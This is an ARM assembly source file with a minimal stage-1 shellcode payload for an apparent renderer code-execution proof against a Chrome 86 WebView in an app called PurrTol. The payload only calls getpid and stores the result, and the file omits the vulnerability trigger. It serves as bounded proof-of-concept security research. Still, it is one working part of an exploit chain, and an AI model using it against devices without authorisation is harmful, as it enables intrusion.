/*
 * Minimal PurrTol Stage 1 result payload for a bounded renderer-RCE proof.
 * Target ABI: 32-bit ARM (AArch32) as reported by PurrTol's Chrome 86 WebView.
 *
 * Performs only getpid (Linux ARM EABI syscall 20), stores the PID in the
 * existing result word at wasm_mem+0x140c (the page's iterations slot), and
 * returns a fixed 0xCC01 completion marker in r0. The marker lets the page
 * display a successful bounded result without issuing another syscall.
 * It does not open files, access storage, create a process, change persistent
 * device state, or perform network I/O.
 *
 * This source is only the payload component; it does not contain or trigger
 * the V8 vulnerability. The renderer's 32-bit ARM ABI and Chrome build still
 * need live confirmation before interpreting a device result.
 */
.syntax unified
.arch armv7-a
.text
.arm
.global purrtol_stage1_getpid
.type purrtol_stage1_getpid, %function

purrtol_stage1_getpid:
    push    {r4-r11, lr}
    mov     r7, #20
    svc     #0
    sub     r4, pc, #20
    add     r5, r4, #0x1000
    add     r5, r5, #0x400
    add     r5, r5, #12
    str     r0, [r5]
    movw    r0, #0xcc01
    pop     {r4-r11, pc}

.size purrtol_stage1_getpid, .-purrtol_stage1_getpid
